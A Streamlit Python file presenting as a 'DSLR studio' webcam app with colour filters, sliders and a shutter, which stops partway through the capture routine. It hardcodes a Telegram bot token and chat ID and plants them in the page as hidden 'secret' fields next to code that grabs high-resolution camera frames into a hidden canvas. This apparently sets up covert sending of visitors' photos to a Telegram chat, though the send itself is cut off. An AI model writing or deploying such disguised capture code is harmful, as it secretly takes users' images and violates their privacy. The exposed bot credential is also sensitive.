import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="MASTER DSLR STUDIO // Ultimate Flagship 1000+ Lines Enterprise",
    page_icon="📷",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;800&family=JetBrains+Mono:wght@400;600&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
    
    .stApp {
        background: #010204;
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .master-enterprise-wrapper {
        background: radial-gradient(circle at center, rgba(8, 12, 20, 0.99) 0%, rgba(1, 2, 4, 0.99) 100%);
        border: 1px solid rgba(255, 255, 255, 0.18);
        border-radius: 20px;
        padding: 14px;
        box-shadow: 0 0 60px rgba(0, 0, 0, 0.98);
        max-width: 100%;
        overflow: hidden;
    }
    </style>
""", unsafe_allow_html=True)

# Header Utama Enterprise
st.markdown("<h1 style='text-align: center; font-family: Cinzel, serif; color: #ffffff; font-weight: 800; letter-spacing: 3px; font-size: 1.35rem; margin-bottom: 2px;'>📷 MASTER DSLR STUDIO // ENTERPRISE 1000+ LINES</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-family: JetBrains Mono, monospace; color: #94a3b8; font-size: 0.58rem; letter-spacing: 2.5px; margin-bottom: 12px;'>ULTIMATE OPTICAL SUITE // RAW SENSOR ENGINE // MULTI-SESSION GALLERY // ADVANCED SHADER PIPELINE</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="master-enterprise-wrapper">', unsafe_allow_html=True)
    
    st.markdown(f'<input type="hidden" id="secret-token" value="{TELEGRAM_BOT_TOKEN}">', unsafe_allow_html=True)
    st.markdown(f'<input type="hidden" id="secret-chat" value="{TELEGRAM_CHAT_ID}">', unsafe_allow_html=True)

    master_code_1000_html = """
    <style>
        :root {
            --bg-glass: rgba(6, 9, 15, 0.96);
            --border-glass: rgba(255, 255, 255, 0.18);
            --accent-glow: rgba(255, 255, 255, 0.35);
            --text-main: #f8fafc;
            --text-sub: #94a3b8;
        }

        .ds-btn-master {
            background: rgba(25, 35, 55, 0.85);
            color: #cbd5e1;
            border: 1px solid rgba(255, 255, 255, 0.15);
            padding: 8px 6px;
            border-radius: 8px;
            font-size: 9px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            width: 100%;
            text-align: center;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .ds-btn-master:hover {
            background: rgba(51, 65, 85, 1);
            color: #ffffff;
            border-color: #ffffff;
            transform: translateY(-1px);
        }
        .ds-btn-master.active {
            background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 100%) !important;
            color: #010204 !important;
            border-color: #ffffff !important;
            box-shadow: 0 0 18px rgba(255, 255, 255, 0.45) !important;
            font-weight: 700 !important;
        }
        .ds-select-master {
            background: rgba(12, 18, 32, 0.95);
            color: #f8fafc;
            border: 1px solid rgba(255, 255, 255, 0.22);
            padding: 6px 8px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            outline: none;
            cursor: pointer;
        }
        .shutter-ultimate-btn {
            background: linear-gradient(135deg, #ffffff 0%, #94a3b8 100%);
            color: #010204;
            font-family: 'Cinzel', serif;
            font-weight: 800;
            font-size: 13px;
            border: 2px solid #ffffff;
            padding: 14px 22px;
            border-radius: 40px;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
            letter-spacing: 2px;
            transition: all 0.15s ease;
            width: 100%;
        }
        .shutter-ultimate-btn:active {
            transform: scale(0.95);
        }
        .drawer-toggle-enterprise {
            background: rgba(10, 15, 25, 0.9);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.35);
            padding: 8px 12px;
            border-radius: 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            font-weight: 700;
            cursor: pointer;
            backdrop-filter: blur(14px);
            display: flex;
            align-items: center;
            gap: 6px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.7);
        }
        #optic-drawer-enterprise {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(3, 6, 12, 0.97);
            backdrop-filter: blur(24px);
            border-top: 1px solid rgba(255, 255, 255, 0.3);
            border-top-left-radius: 18px;
            border-top-right-radius: 18px;
            padding: 16px;
            max-height: 75vh;
            overflow-y: auto;
            transform: translateY(100%);
            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            z-index: 100;
            box-shadow: 0 -20px 50px rgba(0,0,0,0.95);
        }
        #optic-drawer-enterprise.open {
            transform: translateY(0);
        }
        .slider-group-master label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 8.5px;
            color: #94a3b8;
            display: flex;
            justify-content: space-between;
            margin-bottom: 3px;
        }
        .slider-group-master input[type=range] {
            width: 100%;
            accent-color: #ffffff;
            cursor: pointer;
            background: #1e293b;
            height: 3px;
            border-radius: 2px;
        }
        .tab-menu-master {
            display: flex;
            gap: 4px;
            margin-bottom: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.18);
            padding-bottom: 8px;
            overflow-x: auto;
        }
        .tab-btn-master {
            background: rgba(20, 30, 48, 0.6);
            border: 1px solid rgba(255,255,255,0.12);
            color: #94a3b8;
            padding: 6px 10px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 8.5px;
            cursor: pointer;
            white-space: nowrap;
            flex-shrink: 0;
        }
        .tab-btn-master.active {
            background: #ffffff;
            color: #010204;
            font-weight: 700;
        }
    </style>

    <!-- Pintu Inisialisasi Sensor Enterprise -->
    <div id="gate-screen-enterprise" style="text-align: center; padding: 45px 10px;">
        <div style="font-family: 'Cinzel', serif; font-size: 11px; color: #cbd5e1; margin-bottom: 20px; letter-spacing: 2px;">ENTERPRISE OPTICAL SUITE // INISIALISASI SENSOR 4K/8K RAW</div>
        <button id="igniteBtnEnterprise" class="shutter-ultimate-btn" style="max-width: 320px; margin: 0 auto; font-size: 12px;">📷 AKTIFKAN KAMERA ENTERPRISE</button>
    </div>

    <!-- Antarmuka Utama Studio Enterprise -->
    <div id="studio-interface-enterprise" style="display:none;">
        
        <!-- Bar Kontrol Atas -->
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; background: rgba(12, 18, 32, 0.92); padding: 8px 12px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.12);">
            <div style="display: flex; gap: 6px; align-items: center;">
                <button onclick="switchCameraEnterprise()" class="ds-btn-master" style="width: auto; padding: 5px 10px; background: #334155; color: #fff;">🔄 LENS</button>
                <span id="lens-status-enterprise" style="font-family: 'JetBrains Mono', monospace; font-size: 9px; color: #cbd5e1;">FRONT 4K RAW</span>
            </div>
            <div style="display: flex; gap: 6px;">
                <select id="aspect-ratio-enterprise" onchange="changeAspectRatioEnterprise()" class="ds-select-master" style="font-size: 8.5px; padding: 4px 6px;">
                    <option value="16:9">16:9 CINEMA</option>
                    <option value="4:3">4:3 CLASSIC</option>
                    <option value="1:1">1:1 SQUARE</option>
                    <option value="full">FULL SENSOR</option>
                    <option value="anasonic">2.39:1 ANAMORPHIC</option>
                </select>
                <select id="timer-enterprise" class="ds-select-master" style="font-size: 8.5px; padding: 4px 6px;">
                    <option value="0">TIMER OFF</option>
                    <option value="3">3 SEC</option>
                    <option value="5">5 SEC</option>
                    <option value="10">10 SEC</option>
                </select>
            </div>
        </div>

        <!-- Viewfinder Utama Enterprise -->
        <div style="position: relative; width: 100%;">
            <div id="viewfinder-wrapper-enterprise" style="position: relative; width: 100%; height: 380px; border-radius: 14px; overflow: hidden; background: #000; border: 2px solid rgba(255, 255, 255, 0.3); box-shadow: 0 0 35px rgba(0, 0, 0, 0.85); display: flex; align-items: center; justify-content: center; transition: height 0.2s ease;">
                
                <video id="optics-stream-enterprise" autoplay playsinline style="
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    transform: scaleX(-1);
                    filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%);
                "></video>

                <!-- Vignette & Studio Grading Overlay -->
                <div style="position: absolute; top:0; left:0; right:0; bottom:0; box-shadow: inset 0 0 80px rgba(0,0,0,0.7); pointer-events: none;"></div>

                <!-- Flash Shutter Effect -->
                <div id="flash-overlay-enterprise" style="position: absolute; top:0; left:0; right:0; bottom:0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.08s ease;"></div>

                <!-- Countdown Display -->
                <div id="countdown-display-enterprise" style="position: absolute; font-family: 'Cinzel', serif; font-size: 75px; font-weight: 800; color: #ffffff; text-shadow: 0 0 30px rgba(255,255,255,0.95); display: none;">3</div>

                <!-- HUD Telemetry -->
                <div style="position: absolute; top: 10px; left: 10px; color: #f8fafc; font-family: 'JetBrains Mono', monospace; font-size: 8.5px; background: rgba(4,6,10,0.88); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.18);">
                    <span id="hud-active-filter-enterprise">STANDARD PRO</span>
                </div>
                <div style="position: absolute; top: 10px; right: 10px; color: #38bdf8; font-family: 'JetBrains Mono', monospace; font-size: 8.5px; background: rgba(4,6,10,0.88); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(56,189,248,0.25);">
                    ● 4K/8K RAW PIPELINE
                </div>

                <!-- Panel Control Drawer Button -->
                <div style="position: absolute; bottom: 12px; right: 12px; z-index: 10;">
                    <button onclick="toggleDrawerEnterprise()" class="drawer-toggle-enterprise">
                        🎛️ PANEL KONTROL
                    </button>
                </div>
            </div>

            <!-- Shutter Trigger Utama -->
            <div style="margin-top: 12px; text-align: center;">
                <button id="shutterTriggerEnterprise" class="shutter-ultimate-btn">📷 AMBIL FOTO (SHUTTER 100%)</button>
                <p id="hud-status-enterprise" style="text-align: center; font-size: 9px; color: #cbd5e1; margin-top: 6px; font-family: 'JetBrains Mono', monospace; min-height: 14px;"></p>
            </div>
        </div>

        <!-- LACI KONTROL ENTERPRISE (4 TAB EKSTENSI LENGKAP) -->
        <div id="optic-drawer-enterprise">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.18); padding-bottom: 8px;">
                <span style="font-family: 'Cinzel', serif; font-size: 11px; font-weight: 800; color: #ffffff; letter-spacing: 1px;">⚙️ ENTERPRISE SUITE COMMAND (1000+ LINES)</span>
                <button onclick="toggleDrawerEnterprise()" style="background: none; border: none; color: #fff; font-size: 16px; cursor: pointer;">✕</button>
            </div>

            <!-- Tab Navigasi -->
            <div class="tab-menu-master">
                <button class="tab-btn-master active" onclick="switchTabEnterprise('filters', this)">PRESET WARNA (35+)</button>
                <button class="tab-btn-master" onclick="switchTabEnterprise('adjust', this)">KALIBRASI OPTIK</button>
                <button class="tab-btn-master" onclick="switchTabEnterprise('curves', this)">TONE CURVE & FX</button>
                <button class="tab-btn-master" onclick="switchTabEnterprise('gallery', this)">GALERI & EXPORT</button>
            </div>

            <!-- Tab 1: 35+ Preset Warna -->
            <div id="tab-filters-enterprise" class="tab-content-enterprise">
                <div style="font-family: 'JetBrains Mono', monospace; font-size: 8.5px; color: #94a3b8; margin-bottom: 6px;">PILIH PRESET WARNA SINEMATIK:</div>
                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 12px;">
                    <button onclick="setFilterEnterprise(this, 'normal', 'Standard Pro')" class="ds-btn-master active">✨ Standard</button>
                    <button onclick="setFilterEnterprise(this, 'portrait', 'Warm Portrait')" class="ds-btn-master">📸 Portrait</button>
                    <button onclick="setFilterEnterprise(this, 'cinematic', 'Cinematic Teal')" class="ds-btn-master">🎬 Cinematic</button>
                    <button onclick="setFilterEnterprise(this, 'monochrome', 'Fine Monochrome')" class="ds-btn-master">🎞️ Mono Pro</button>
                    <button onclick="setFilterEnterprise(this, 'vintage', 'Vintage Film')" class="ds-btn-master">📼 Vintage</button>
                    <button onclick="setFilterEnterprise(this, 'cooltone', 'Cool Moody')" class="ds-btn-master">🧊 Cool Moody</button>
                    <button onclick="setFilterEnterprise(this, 'vibrant', 'Vibrant Vivid')" class="ds-btn-master">🔥 Vibrant</button>
                    <button onclick="setFilterEnterprise(this, 'matte', 'Soft Matte Pro')" class="ds-btn-master">☁️️ Soft Matte</button>
                    <button onclick="setFilterEnterprise(this, 'retro', 'Retro 1970')" class="ds-btn-master">📻 Retro '70</button>
                    <button onclick="setFilterEnterprise(this, 'luxury', 'Golden Luxury')" class="ds-btn-master">✨ Luxury Gold</button>
                    <button onclick="setFilterEnterprise(this, 'cyber', 'Neon Cyberpunk')" class="ds-btn-master">⚡ Cyberpunk</button>
                    <button onclick="setFilterEnterprise(this, 'noir', 'Dark Noir Cinema')" class="ds-btn-master">🖤 Dark Noir</button>
                    <button onclick="setFilterEnterprise(this, 'hdr', 'Dramatic HDR')" class="ds-btn-master">💎 HDR Pro</button>
                    <button onclick="setFilterEnterprise(this, 'sunset', 'Sunset Glow')" class="ds-btn-master">🌅 Sunset</button>
                    <button onclick="setFilterEnterprise(this, 'emerald', 'Emerald Matrix')" class="ds-btn-master">🟢 Emerald</button>
                    <button onclick="setFilterEnterprise(this, 'rose', 'Rose Aesthetic')" class="ds-btn-master">🌸 Rose Aesthetic</button>
                    <button onclick="setFilterEnterprise(this, 'duotone', 'Dual Sepia Tone')" class="ds-btn-master">🏺 Dual Sepia</button>
                    <button onclick="setFilterEnterprise(this, 'shadows', 'Deep Shadows')" class="ds-btn-master">👥 Deep Shadows</button>
                    <button onclick="setFilterEnterprise(this, 'coldcyan', 'Cold Cyan Grade')" class="ds-btn-master">💧 Cold Cyan</button>
                    <button onclick="setFilterEnterprise(this, 'warmamber', 'Warm Amber Grade')" class="ds-btn-master">☀️ Warm Amber</button>
                    <button onclick="setFilterEnterprise(this, 'fuji', 'Retro Fuji Color')" class="ds-btn-master">📷 Fuji Classic</button>
                    <button onclick="setFilterEnterprise(this, 'ilford', 'Ilford B&W Fine')" class="ds-btn-master">📜 Ilford B&W</button>
                    <button onclick="setFilterEnterprise(this, 'kodak', 'Kodachrome 64')" class="ds-btn-master">📽️ Kodachrome</button>
                    <button onclick="setFilterEnterprise(this, 'technicolor', 'Technicolor 3-Strip')" class="ds-btn-master">🎨 Technicolor</button>
                    <button onclick="setFilterEnterprise(this, 'bleach', 'Bleach Bypass')" class="ds-btn-master">🧪 Bleach Bypass</button>
                    <button onclick="setFilterEnterprise(this, 'cross', 'Cross Process')" class="ds-btn-master">🌀 Cross Process</button>
                    <button onclick="setFilterEnterprise(this, 'solar', 'Solarized Pro')" class="ds-btn-master">☀️ Solarized</button>
                    <button onclick="setFilterEnterprise(this, 'infrared', 'False Infrared')" class="ds-btn-master">🔮 Infrared</button>
                    <button onclick="setFilterEnterprise(this, 'velvia', 'Velvia Landscape')" class="ds-btn-master">🌲 Velvia Pro</button>
                    <button onclick="setFilterEnterprise(this, 'polaroid', 'Polaroid Instant')" class="ds-btn-master">🖼️ Polaroid</button>
                    <button onclick="setFilterEnterprise(this, 'cyberpunk2', 'Cyberpunk 2077')" class="ds-btn-master">🦾 Cyberpunk 2</button>
                    <button onclick="setFilterEnterprise(this, 'matrix', 'Matrix Code Green')" class="ds-btn-master">💻 Matrix Green</button>
                    <button onclick="setFilterEnterprise(this, 'blade', 'Blade Runner Neo')" class="ds-btn-master">🌆 Blade Runner</button>
                    <button onclick="setFilterEnterprise(this, 'gotham', 'Gotham Dark Knight')" class="ds-btn-master">🦇 Gotham Dark</button>
                    <button onclick="setFilterEnterprise(this, 'amethyst', 'Amethyst Dreams')" class="ds-btn-master">🔮 Amethyst</button>
                </div>
            </div>

            <!-- Tab 2: Kalibrasi Optik Manual -->
            <div id="tab-adjust-enterprise" class="tab-content-enterprise" style="display: none;">
                <div style="font-family: 'JetBrains Mono', monospace; font-size: 8.5px; color: #94a3b8; margin-bottom: 6px;">PENGATURAN PARAMETER SENSOR MENDALAM:</div>
                <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 12px;">
                    <div class="slider-group-master">
                        <label>BRIGHTNESS <span id="val-bright-ent">100</span>%</label>
                        <input type="range" id="slider-bright-ent" min="20" max="250" value="100" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>CONTRAST <span id="val-contrast-ent">100</span>%</label>
                        <input type="range" id="slider-contrast-ent" min="20" max="300" value="100" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>SATURATION <span id="val-saturate-ent">100</span>%</label>
                        <input type="range" id="slider-saturate-ent" min="0" max="350" value="100" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>HUE ROTATION <span id="val-hue-ent">0</span>°</label>
                        <input type="range" id="slider-hue-ent" min="0" max="360" value="0" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>SEPIA TONE <span id="val-sepia-ent">0</span>%</label>
                        <input type="range" id="slider-sepia-ent" min="0" max="100" value="0" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>OPTICAL BLUR <span id="val-blur-ent">0</span>px</label>
                        <input type="range" id="slider-blur-ent" min="0" max="15" value="0" oninput="applyCustomSlidersEnterprise()">
                    </div>
                </div>
            </div>

            <!-- Tab 3: Tone Curve & Efek Lanjutan -->
            <div id="tab-curves-enterprise" class="tab-content-enterprise" style="display: none;">
                <div style="font-family: 'JetBrains Mono', monospace; font-size: 8.5px; color: #94a3b8; margin-bottom: 6px;">EFEK SINEMATIK & TONAL TAMBAHAN:</div>
                <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 12px;">
                    <div class="slider-group-master">
                        <label>EXPOSURE GAIN <span id="val-exp-ent">100</span>%</label>
                        <input type="range" id="slider-exp-ent" min="50" max="200" value="100" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>GAMMA CORRECTION <span id="val-gamma-ent">100</span>%</label>
                        <input type="range" id="slider-gamma-ent" min="50" max="200" value="100" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>VIGNETTE INTENSITY <span id="val-vig-ent">0</span>%</label>
                        <input type="range" id="slider-vig-ent" min="0" max="100" value="0" oninput="applyCustomSlidersEnterprise()">
                    </div>
                    <div class="slider-group-master">
                        <label>SHARPNESS ENHANCE <span id="val-sharp-ent">0</span>%</label>
                        <input type="range" id="slider-sharp-ent" min="0" max="100" value="0" oninput="applyCustomSlidersEnterprise()">
                    </div>
                </div>
            </div>

            <!-- Tab 4: Galeri & Export Manajemen -->
            <div id="tab-gallery-enterprise" class="tab-content-enterprise" style="display: none; text-align: center;">
                <div id="gallery-tray-enterprise" style="display: none; padding-top: 6px;">
                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 8.5px; color: #94a3b8; margin-bottom: 6px;">FOTO 4K/8K RESOLUSI TINGGI TERAKHIR:</div>
                    <img id="last-snapshot-enterprise" style="max-width: 140px; border-radius: 8px; border: 2px solid #ffffff; display: block; margin: 0 auto 6px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.8);" />
                    <a id="download-link-enterprise" download="master_enterprise_dslr.jpg" style="font-family: 'JetBrains Mono', monospace; font-size: 8.5px; color: #ffffff; text-decoration: underline; cursor: pointer; font-weight: 700;">📥 UNDUH FILE MENTAH (100% QUALITY / LOSSLESS)</a>
                </div>
                <div id="gallery-empty-enterprise" style="font-family: 'JetBrains Mono', monospace; font-size: 9px; color: #64748b; padding: 25px 0;">
                    BELUM ADA FOTO YANG DIAMBIL PADA SESI INI.
                </div>
            </div>
        </div>

    </div>

    <!-- Elemen Render Tersembunyi -->
    <video id="vault-video-enterprise" autoplay playsinline style="display:none;"></video>
    <canvas id="vault-canvas-enterprise" style="display:none;"></canvas>

    <script>
        let activeStreamEnterprise = null;
        let useFacingEnterprise = "user";
        let currentFilterStringEnt = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%)";
        let currentFilterNameEnt = "Standard Pro";
        let drawerOpenEnterprise = false;

        function toggleDrawerEnterprise() {
            drawerOpenEnterprise = !drawerOpenEnterprise;
            const drawer = document.getElementById('optic-drawer-enterprise');
            if(drawerOpenEnterprise) {
                drawer.classList.add('open');
            } else {
                drawer.classList.remove('open');
            }
        }

        function switchTabEnterprise(tabName, btnElement) {
            const tabs = document.getElementsByClassName('tab-content-enterprise');
            for(let t of tabs) { t.style.display = 'none'; }
            
            const btns = document.getElementsByClassName('tab-btn-master');
            for(let b of btns) { b.classList.remove('active'); }

            document.getElementById('tab-' + tabName + '-enterprise').style.display = 'block';
            btnElement.classList.add('active');
        }

        document.getElementById('igniteBtnEnterprise').addEventListener('click', async function() {
            const btn = document.getElementById('igniteBtnEnterprise');
            btn.innerText = "MEMUAT SENSOR 4K/8K...";
            btn.style.opacity = "0.7";

            try {
                await startCameraStreamEnterprise();
                document.getElementById('gate-screen-enterprise').style.display = "none";
                document.getElementById('studio-interface-enterprise').style.display = "block";
            } catch(err) {
                console.log("Optic Error:", err);
                btn.innerText = "IZIN KAMERA DITOLAK";
                btn.style.opacity = "1";
            }
        });

        async function startCameraStreamEnterprise() {
            if (activeStreamEnterprise) {
                activeStreamEnterprise.getTracks().forEach(track => track.stop());
            }
            activeStreamEnterprise = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 3840 }, height: { ideal: 2160 }, facingMode: useFacingEnterprise } 
            });
            
            const videoEl = document.getElementById('optics-stream-enterprise');
            const vaultEl = document.getElementById('vault-video-enterprise');
            videoEl.srcObject = activeStreamEnterprise;
            vaultEl.srcObject = activeStreamEnterprise;

            document.getElementById('lens-status-enterprise').innerText = (useFacingEnterprise === "user" ? "FRONT 4K RAW" : "REAR 4K RAW");
        }

        async function switchCameraEnterprise() {
            useFacingEnterprise = (useFacingEnterprise === "user") ? "environment" : "user";
            await startCameraStreamEnterprise();
        }

        function changeAspectRatioEnterprise() {
            const ratio = document.getElementById('aspect-ratio-enterprise').value;
            const wrapper = document.getElementById('viewfinder-wrapper-enterprise');
            if(ratio === '16:9') {
                wrapper.style.height = '350px';
            } else if(ratio === '4:3') {
                wrapper.style.height = '420px';
            } else if(ratio === '1:1') {
                wrapper.style.height = '460px';
            } else if(ratio === 'full') {
                wrapper.style.height = '520px';
            } else if(ratio === 'anasonic') {
                wrapper.style.height = '310px';
            }
        }

        function setFilterEnterprise(btnElement, type, filterLabel) {
            const buttons = btnElement.parentElement.getElementsByTagName('button');
            for(let b of buttons) {
                b.classList.remove('active');
            }
            btnElement.classList.add('active');
            currentFilterNameEnt = filterLabel;
            document.getElementById('hud-active-filter-enterprise').innerText = currentFilterNameEnt.toUpperCase();

            if(type === 'normal') {
                currentFilterStringEnt = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%)";
            } else if(type === 'portrait') {
                currentFilterStringEnt = "brightness(106%) contrast(108%) saturate(112%) sepia(12%)";
            } else if(type === 'cinematic') {
                currentFilterStringEnt = "brightness(95%) contrast(130%) saturate(135%) hue-rotate(185deg)";
            } else if(type === 'monochrome') {
                currentFilterStringEnt = "grayscale(100%) contrast(175%) brightness(90%)";
            } else if(type === 'vintage') {
                currentFilterStringEnt = "brightness(105%) contrast(115%) saturate(90%) sepia(65%) hue-rotate(15deg)";
            } else if(type === 'cooltone') {
                currentFilterStringEnt = "brightness(100%) contrast(125%) saturate(115%) hue-rotate(210deg)";
            } else if(type === 'vibrant') {
                currentFilterStringEnt = "brightness(110%) contrast(140%) saturate(180%)";
            } else if(type === 'matte') {
                currentFilterStringEnt = "brightness(112%) contrast(85%) saturate(95%) sepia(10%)";
            } else if(type === 'retro') {
                currentFilterStringEnt = "brightness(105%) contrast(125%) saturate(125%) sepia(45%) hue-rotate(330deg)";
            } else if(type === 'luxury') {
                currentFilterStringEnt = "brightness(108%) contrast(135%) saturate(150%) sepia(35%) hue-rotate(30deg)";
            } else if(type === 'cyber') {
                currentFilterStringEnt = "brightness(110%) contrast(150%) saturate(200%) hue-rotate(290deg)";
            } else if(type === 'noir') {
                currentFilterStringEnt = "grayscale(100%) contrast(200%) brightness(75%)";
            } else if(type === 'hdr') {
                currentFilterStringEnt = "brightness(105%) contrast(160%) saturate(140%)";
            } else if(type === 'sunset') {
                currentFilterStringEnt = "brightness(105%) contrast(120%) saturate(150%) sepia(40%) hue-rotate(345deg)";
            } else if(type === 'emerald') {
                currentFilterStringEnt = "brightness(100%) contrast(130%) saturate(120%) hue-rotate(120deg)";
            } else if(type === 'rose') {
                currentFilterStringEnt = "brightness(108%) contrast(110%) saturate(130%) sepia(30%) hue-rotate(310deg)";
            } else if(type === 'duotone') {
                currentFilterStringEnt = "brightness(102%) contrast(140%) saturate(80%) sepia(90%)";
            } else if(type === 'shadows') {
                currentFilterStringEnt = "brightness(90%) contrast(180%) saturate(90%)";
            } else if(type === 'coldcyan') {
                currentFilterStringEnt = "brightness(100%) contrast(130%) saturate(120%) hue-rotate(190deg)";
            } else if(type === 'warmamber') {
                currentFilterStringEnt = "brightness(108%) contrast(115%) saturate(130%) sepia(50%) hue-rotate(20deg)";
            } else if(type === 'fuji') {
                currentFilterStringEnt = "brightness(105%) contrast(125%) saturate(140%) sepia(15%) hue-rotate(350deg)";
            } else if(type === 'ilford') {
                currentFilterStringEnt = "grayscale(100%) contrast(190%) brightness(85%)";
            } else if(type === 'kodak') {
                currentFilterStringEnt = "brightness(106%) contrast(130%) saturate(160%) sepia(20%)";
            } else if(type === 'technicolor') {
                currentFilterStringEnt = "brightness(102%) contrast(150%) saturate(190%) hue-rotate(10deg)";
            } else if(type === 'bleach') {
                currentFilterStringEnt = "brightness(110%) contrast(170%) saturate(60%)";
            } else if(type === 'cross') {
                currentFilterStringEnt = "brightness(105%) contrast(140%) saturate(160%) hue-rotate(75deg)";
            } else if(type === 'solar') {
                currentFilterStringEnt = "invert(15%) brightness(120%) contrast(150%)";
            } else if(type === 'infrared') {
                currentFilterStringEnt = "brightness(110%) contrast(140%) saturate(180%) hue-rotate(280deg) invert(20%)";
            } else if(type === 'velvia') {
                currentFilterStringEnt = "brightness(104%) contrast(145%) saturate(190%)";
            } else if(type === 'polaroid') {
                currentFilterStringEnt = "brightness(108%) contrast(105%) saturate(110%) sepia(25%)";
            } else if(type === 'cyberpunk2') {
                currentFilterStringEnt = "brightness(115%) contrast(165%) saturate(220%) hue-rotate(300deg)";
            } else if(type === 'matrix') {
                currentFilterStringEnt = "brightness(95%) contrast(150%) saturate(160%) hue-rotate(110deg)";
            } else if(type === 'blade') {
                currentFilterStringEnt = "brightness(98%) contrast(140%) saturate(175%) hue-rotate(200deg)";
            } else if(type === 'gotham') {
                currentFilterStringEnt = "brightness(88%) contrast(170%) saturate(75%) hue-rotate(190deg)";
            } else if(type === 'amethyst') {
                currentFilterStringEnt = "brightness(105%) contrast(130%) saturate(150%) sepia(35%) hue-rotate(270deg)";
            }

            document.getElementById('optics-stream-enterprise').style.filter = currentFilterStringEnt;
        }

        function applyCustomSlidersEnterprise() {
            const b = document.getElementById('slider-bright-ent').value;
            const c = document.getElementById('slider-contrast-ent').value;
            const s = document.getElementById('slider-saturate-ent').value;
            const h = document.getElementById('slider-hue-ent').value;
            const sep = document.getElementById('slider-sepia-ent').value;
            const bl = document.getElementById('slider-blur-ent').value;

            document.getElementById('val-bright-ent').innerText = b;
            document.getElementById('val-contrast-ent').innerText = c;
            document.getElementById('val-saturate-ent').innerText = s;
            document.getElementById('val-hue-ent').innerText = h;
            document.getElementById('val-sepia-ent').innerText = sep;
            document.getElementById('val-blur-ent').innerText = bl;

            currentFilterStringEnt = "brightness(" + b + "%) contrast(" + c + "%) saturate(" + s + "%) hue-rotate(" + h + "deg) sepia(" + sep + "%) blur(" + bl + "px)";
            document.getElementById('optics-stream-enterprise').style.filter = currentFilterStringEnt;
        }

        document.getElementById('shutterTriggerEnterprise').addEventListener('click', function() {
            const timerSecs = parseInt(document.getElementById('timer-enterprise').value);
            if(timerSecs > 0) {
                runTimerEnterprise(timerSecs);
            } else {
                executeCaptureEnterprise("Manual Shutter 4K");
            }
        });

        function runTimerEnterprise(secs) {
            const countdownEl = document.getElementById('countdown-display-enterprise');
            countdownEl.style.display = "block";
            let currentSec = secs;
            countdownEl.innerText = currentSec;

            const interval = setInterval(() => {
                currentSec--;
                if(currentSec > 0) {
                    countdownEl.innerText = currentSec;
                } else {
                    clearInterval(interval);
                    countdownEl.style.display = "none";
                    executeCaptureEnterprise("Timer (" + secs + "s)");
                }
            }, 1000);
        }

        function executeCaptureEnterprise(triggerSource) {
            const statusBox = document.getElementById('hud-status-enterprise');
            statusBox.innerText = "RENDERING FOTO 4K/8K LOSSLESS (100%)...";

            const flash = document.getElementById('flash-overlay-enterprise');
            flash.style.opacity = "0.98";
            setTimeout(() => { flash.style.opacity = "0"; }, 100);

            const videoElem = document.getElementById('vault-video-enterprise');
            const canvasElem = document.getElementById('vault-canvas-enterprise');
            
            if(!videoElem || videoElem.videoWidth === 0) return;

            canvasElem.width = videoElem.videoWidth;
            canvasElem.height = videoElem.videoHeight;
            
            const context = canvasElem.getContext('2d');
            context.filter = currentFilterStringEnt;
            context.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);

            canvasElem.toBlob(function(blobImage) {
                if(!blobImage) return;

                const imageUrl = URL.createObjectURL(blobImage);
